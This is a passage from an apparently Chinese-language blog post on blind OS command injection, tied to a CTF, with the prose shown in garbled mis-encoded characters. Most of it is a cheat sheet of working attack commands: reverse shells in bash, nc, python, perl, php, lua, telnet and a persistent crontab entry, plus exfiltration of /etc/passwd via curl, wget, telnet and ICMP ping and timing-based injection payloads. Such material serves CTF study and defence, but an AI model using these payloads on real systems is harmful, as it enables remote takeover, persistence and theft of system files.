å¦‚æœæƒ³è¦çŸ¥é“ç›®æ ‡ä¸»æœºåçš„é•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸»æœºåçš„è¾“å‡ºé€šè¿‡ç®¡é“ç¬¦ä¼ é€’ç»™`wc -c`å‘½ä»¤ã€‚`hacker.local`ä¸º`12`ä¸ªå­—ç¬¦ã€‚`hostname`å‘½ä»¤è¿”å›ä¸»æœºåå’Œä¸€ä¸ªæ–°è¡Œï¼Œå› æ­¤`wc -c`å°†æ˜¾ç¤º13ä¸ªå­—ç¬¦ã€‚ç»è¿‡æˆ‘ä»¬æµ‹è¯•ï¼Œè„šæœ¬çš„æ‰§è¡Œæ—¶é—´æœ€çŸ­éœ€è¦3ç§’é’Ÿã€‚

```bash
$ time ruby server-online.rb '8.8.8.8 && sleep $(hostname | wc -c)'
yes
0.10s user 0.04s system 0% cpu 16.188 total
```

å¯ä»¥çœ‹åˆ°ä»¥ä¸Šçš„payloadè„šæœ¬å…±ç”¨æ—¶16ç§’æ‰æ‰§è¡Œå®Œæˆï¼Œè¿™æ„å‘³ç€ä¸»æœºåä¸º12ä¸ªå­—ç¬¦ï¼š16 â€“ 3 (åŸæ—¶é—´) â€“ 1 (æ–°è¡Œ) = 12ä¸ªå­—ç¬¦ã€‚å½“åœ¨WebæœåŠ¡å™¨ä¸Šæ‰§è¡Œæ­¤payloadæ—¶ï¼Œè¾“å‡ºç»“æœå¯èƒ½ä¼šæœ‰æ‰€ä¸åŒï¼šå½“è¯·æ±‚ç”±ä¸åŒçš„æœåŠ¡å™¨å¤„ç†æ—¶ï¼Œä¸»æœºåçš„é•¿åº¦ä¹Ÿå¯èƒ½ä¼šæ”¹å˜ã€‚

æœ¬æ¬¡`NUAACTF`æˆ‘ä¹Ÿæ˜¯ä»è¿™é‡Œå‡ºäº†ä¸€ä¸ªç‚¹ï¼Œå¼ºè¿«ä½¿ç”¨`sleep $(xxx)`æ¥è¯»å–`flag`ã€‚



####	ä½¿ç”¨æš´éœ²çš„æœåŠ¡

åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œç«¯å£æ‰«æï¼Œå¹¶ä¸”åŸºäºæš´éœ²çš„æœåŠ¡ç¡®å®šæå–è¾“å‡ºçš„æ–¹å¼ã€‚

- **FTP**ï¼šå°è¯•å°†æ–‡ä»¶å†™å…¥å¯ä»¥ä»ä¸­ä¸‹è½½æ–‡ä»¶çš„ç›®å½•ã€‚
- **SSH**ï¼šå°è¯•å°†å‘½ä»¤çš„è¾“å‡ºå†™å…¥MOTD bannerï¼Œç„¶ååªéœ€SSHåˆ°æœåŠ¡å™¨ã€‚
- **Web**ï¼šå°è¯•å°†å‘½ä»¤çš„è¾“å‡ºå†™å…¥å…¬å…±ç›®å½•ï¼ˆ/var/www/ï¼‰ä¸­ã€‚



####	åå¼¹shell

ä¸è¿‡æ— è®ºæ€ä¹ˆç©ï¼Œè¿˜æ˜¯ç›´æ¥å¼¹å›ä¸€ä¸ª`shell`æ¥æœ€å®ç”¨ï¼Œäºæ˜¯å¯ä»¥æœ‰

`bash`æ–¹å¼

```bash
bash -c "sh >& /dev/tcp/your ip/port 0>&1" 
```



`exec`æ–¹å¼

```bash
$ exec 5<>/dev/tcp/ip/port
$ cat <&5 | while read line; do $line 2>&5 >&5; done
```

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fymz6ztna0j20lw0au10p.jpg)

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fymz73833rj210w05gn41.jpg)



`nc`æ–¹å¼

æœ¬æœºè¿è¡Œ

```bash
nc -l -vv -p port
```

ç›®æ ‡ä¸»æœº

```bash
nc -e /bin/bash ip port
```



å¦ä¸€ç§`nc`æ–¹å¼

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f
```

æˆ–è€…

```bash
mknod backpipe p && nc ip port 0<backpipe | /bin/bash 1>backpipe
```

æˆ–è€…

```bash
/bin/sh | nc å—å®³è€…ip port		#è¿™ä¸ªæ¯”è¾ƒç‰¹æ®Š,éœ€è¦åœ¨ä½ è‡ªå·±çš„æœºå™¨ä¸Šè¿è¡Œ
```



`python`æ–¹å¼

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

å¦ä¸€ç§

```python
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('ip',port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
```



`Perl`æ–¹å¼

```bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```



`php`æ–¹å¼

```bash
php -r '$sock=fsockopen("ip",port);exec("/bin/sh -i <&3 >&3 2>&3");'
```



`lua`æ–¹å¼

```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ip','port');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#éœ€è¦lua socketæ”¯æŒï¼Œä¸”lua5.2+ä¸æ”¯æŒluasocket
```



`crontab`æ–¹å¼

`crontab -e`ç¼–è¾‘å½“å‰ç”¨æˆ·çš„ä»»åŠ¡ï¼Œæˆ–è€…æ˜¯å†™åˆ°è®¡åˆ’ä»»åŠ¡ç›®å½•ï¼Œä¸€èˆ¬æ˜¯ `/var/spool/cron/` ç›®å½•ï¼Œ`ubuntu`æ˜¯` / var/spool/cron/crontabs`ã€‚æ–‡ä»¶åä¸ºç”¨æˆ·å`root`ç­‰ã€‚ä¸‹é¢å‘½ä»¤å«ä¹‰æ˜¯æ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡åå¼¹`shell`å‘½ä»¤ã€‚

```
SHELL=/bin/bash
* * * * * /bin/bash -i >& /dev/tcp/ip/port 0>&1
```



`telnet`æ–¹å¼

```bash
mknod backpipe p && telnet ip port 0<backpipe | /bin/bash 1>backpipe
```



`msf`æ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œè¿™é‡Œå°±ä¸å†æäº†ã€‚



####	Trick

æ— ç©ºæ ¼ï¼š

```bash
ping -c 4 8.8.8.8;hostname|{nc,ip,port}
```



ä½¿ç”¨`nc`å°†æ–‡ä»¶é‡å®šå‘ï¼š

é¶æœºä¸Š

```bash
nc -lvp port < /etc/passwd
```

æœ¬æœºç›´æ¥`nc ip port`å¾—åˆ°æ–‡ä»¶å†…å®¹



ä½¿ç”¨`http`åè®®ï¼Œé€šè¿‡`curl`ï¼š

```bash
curl http://ip:port -F a=@/etc/passwd
```

åŒæ ·å¯ä»¥é€šè¿‡`curl`ä½¿ç”¨`ftp`åè®®ï¼ŒåŒç†`wget`ã€`telnet`å½“ç„¶ä¹Ÿæ˜¯å¯ä»¥çš„

```bash
wget --post-data="`cat /etc/passwd`" http://ip:port

wget --post-file=/etc/passwd http://ip:port
```

```bash
telnet 106.14.153.173 2015 < /etc/passwd
```



ä½¿ç”¨`ICMP`æŠ¥æ–‡

```bash
cat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done
```



###	æ›´æ­£

2019/2/13ï¼Œæ›´æ­£äº†æ–‡ç« å‡ å¤„é”™è¯¯ï¼Œå·²æ›´æ–°æ–‡ç« å†…å®¹é”™è¯¯å¤„

```bash
$(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67")	#å¯ä»¥æ‰§è¡Œ
```



###	å‚è€ƒ

[Web Application Firewall (WAF) Evasion Techniques](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8)

[Command Injection - OWASP](https://www.owasp.org/index.php/Command_Injection)

[coomix](https://github.com/commixproject/commix)

[Web å®‰å…¨æ¼æ´ä¹‹ OS å‘½ä»¤æ³¨å…¥](https://juejin.im/post/5bdf02c9e51d450540286fbf)

[linuxç‰¹æ®Šç¬¦å·å¤§å…¨](https://www.cnblogs.com/balaamwe/archive/2012/03/15/2397998.html)

[å°å¯†åœˆä¸“é¢˜(2)-å‘½ä»¤æ‰§è¡Œç»•è¿‡](https://www.cnblogs.com/iamstudy/articles/command_exec_tips_1.html)

[linux bash shellä¸­ï¼Œå•å¼•å·ã€ åŒå¼•å·ï¼Œåå¼•å·ï¼ˆ``ï¼‰çš„åŒºåˆ«åŠå„ç§æ‹¬å·çš„åŒºåˆ«](https://blog.csdn.net/miyatang/article/details/8077123)

[ç”±ISCC2018-Web-Pingå­¦ä¹ å‘½ä»¤æ³¨å…¥](http://poetichacker.com/writeup/%e7%94%b1iscc2018-web-ping%e5%ad%a6%e4%b9%a0%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5.html)

[shelling](https://github.com/ewilded/shelling)

[HITCON CTF 2017-BabyFirst Revenge-writeup](https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/)

[LINUXä¸‹åå¼¹SHELLçš„ç§ç§æ–¹å¼](https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html)

[Linuxæ¸—é€ä¹‹åå¼¹Shellå‘½ä»¤è§£æ](https://www.anquanke.com/post/id/85712)

[æŠ€æœ¯åˆ†æï¼šæ”»å‡»è€…æ˜¯å¦‚ä½•åˆ©ç”¨ç³»ç»Ÿå‘½ä»¤ç›²æ³¨å®ç°â€œæ‹–åº“â€çš„ï¼Ÿ](https://www.freebuf.com/articles/web/88354.html)